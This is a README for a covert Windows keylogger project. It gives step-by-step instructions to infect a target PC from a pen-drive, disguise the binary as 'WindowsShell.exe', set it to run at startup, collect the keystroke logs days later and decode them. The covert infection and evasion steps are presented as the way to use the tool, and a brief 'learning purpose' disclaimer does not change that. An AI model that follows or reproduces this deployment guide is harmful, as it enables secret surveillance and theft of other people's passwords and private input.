# EphialtesOfTrachis

#### A Terrific Keystroke Recorder

This tacky program hides itself in the subject’s PC (Windows XP or later), and silently records all keyboard and mouse operations. It is launched automatically with PC start, then stores data in Virtual-Key code with record-date. Now all you have to do is- collect the record, and decode it.

**This project is created only for learning purpose.**

### How to use?

1. Download the full package from [here](https://github.com/KnockEngine/EphialtesOfTrachis.git), unzip it, and move it to your pen-drive. It should look something like this-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger"/>
 </div>

 **WindowsShell.exe** is the compiled and renamed form of [**Keylogger.cpp**](https://github.com/KnockEngine/EphialtesOfTrachis/blob/master/Keylogger.cpp). This is done as no-one will let a keylogger program run in their PC! **WindowsShell** is the link file of **WindowsShell.exe**. 

2. Insert your pen-drive in a computer and run **Infect.bat**. This will install **WindowsShell.exe** (in the *%appdata%* folder) & **WindowsShell.lnk** (in *%appdata%\Microsoft\Windows\Start Menu\Programs\Startup*) in that PC, and start it. 

3. Wait for some days , then return to the PC, insert the pen-drive and run **CollectData.bat**. You will get a file named **Record.log**. This is what it contains-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20914395/89d6b268-bba9-11e6-9586-dae692aa0405.png" alt="Record" width="600px" height=auto />
 </div>

4. Now, simply run **RecordDecoder.exe** (keep **Record.log** in the same folder & do not rename it), and you will get **Data.log**. This file contains all the key-strokes and mouse-clicks. It is all up to you now to find necessary information from this. 

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20915077/d9e3ffbe-bbad-11e6-87f1-d7c079c3cfb7.png" alt="Data" width="600px" height=auto />
 </div>

 You may use [**RecordDecoderFocused**](https://github.com/KnockEngine/EphialtesOfTrachis/blob/master/RecordDecoderFocused.cpp) instead of **RecordDecoder.exe**, it will get rid of some unnecessary data automatically for you.

5. If you want to remove the Keylogger from that PC, run **Cure.bat**.

**Note:** *We will not take any responsibility of someone else's ill act with my program*. But we do believe that a real learner will learn a lot from this.

### License
<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/KnockEngine/EphialtesOfTrachis">EphialtesOfTrachis</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
